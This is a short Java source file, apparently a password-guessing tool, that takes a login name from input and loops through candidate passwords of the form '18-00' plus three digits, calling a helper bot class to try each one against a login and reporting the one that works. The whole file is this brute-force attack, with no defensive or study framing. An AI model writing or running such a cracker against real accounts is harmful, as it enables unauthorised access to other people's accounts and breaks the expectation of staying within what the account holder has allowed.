package com.artek.HtmlParser;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Parser {

    public static String login = "";
    public static String password = "18-00";
    public static String trueFor = "NOT FOUND";
    public static boolean isFound = false;

    public static void main(String[] args) throws IOException {

        BufferedReader stream = new BufferedReader(new InputStreamReader(System.in));
        String login = stream.readLine();

        EjBot bot = new EjBot(login, password);

        for (int k = 0; k < 5; k++) {

            for (int i = 0; i <= 99; i++) {

                    String pass = bot.password + k + Integer.toString(i);
                    if (i < 10 && !isFound) {
                        String pass2 = bot.password + k + "0" + Integer.toString(i);
                        System.out.println("TRYING FOR " + pass2);
                        bot.parseMessage(login, pass2);
                        continue;
                    }
                    if (!isFound) {
                        System.out.println("TRYING FOR " + pass);
                        bot.parseMessage(login, pass);
                    }

            }

        }

        System.out.println("=====================================================");
        System.out.println("RIGHT PASSWORD IS " + trueFor);

    }
}
